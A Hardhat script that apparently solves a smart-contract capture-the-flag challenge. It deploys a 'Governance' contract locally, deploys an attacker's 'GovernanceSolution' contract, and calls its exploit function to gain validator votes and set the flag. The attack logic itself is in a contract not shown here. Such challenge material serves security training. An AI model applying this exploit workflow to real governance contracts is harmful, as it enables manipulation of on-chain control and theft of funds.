const { ethers } = require("hardhat");

async function deploy(deployer) {
  const Governance = await ethers.getContractFactory("Governance", deployer);
  const governance = await Governance.deploy("");
  console.log("Governance contract:", governance.address);

  return governance;
}

async function exploit(attacker, target) {
  const GovernanceSolution = await ethers.getContractFactory(
    "GovernanceSolution",
    attacker
  );
  const solution = await GovernanceSolution.deploy(
    target.address,
    attacker.address
  );
  console.log("Solution contract:", solution.address);

  try {
    await target.connect(attacker).setflag();
  } catch (error) {
    console.log("Before: isComplete():", error.toString());
  }

  await solution.connect(attacker).exploit();
  await target.connect(attacker).setValidator();
  console.log(
    "validatorVotes:",
    await target.connect(attacker).validatorVotes(attacker.address)
  );
  console.log("After: isComplete():", await target.connect(attacker).setflag());
}

async function main() {
  let [deployer, attacker] = await ethers.getSigners();
  let governance = await deploy(deployer);

  await exploit(attacker, governance);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
